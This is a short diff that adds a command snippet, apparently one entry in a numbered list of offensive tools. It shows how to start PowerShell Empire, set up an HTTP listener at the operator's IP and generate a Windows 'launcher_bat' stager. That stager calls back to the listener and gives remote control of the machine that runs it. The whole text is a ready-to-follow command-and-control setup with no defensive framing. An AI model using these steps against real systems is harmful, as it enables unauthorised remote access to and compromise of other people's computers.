@@ -1,0 +1,14 @@
+# 2. Empire (PowerShell Empire)
+# Purpose: Start HTTP listener and generate stager payload for Windows
+# =======================
+./empire
+
+# Inside Empire console:
+listeners
+uselistener http
+set Host http://<your-IP>
+execute
+
+usestager windows/launcher_bat
+set Listener http
+execute
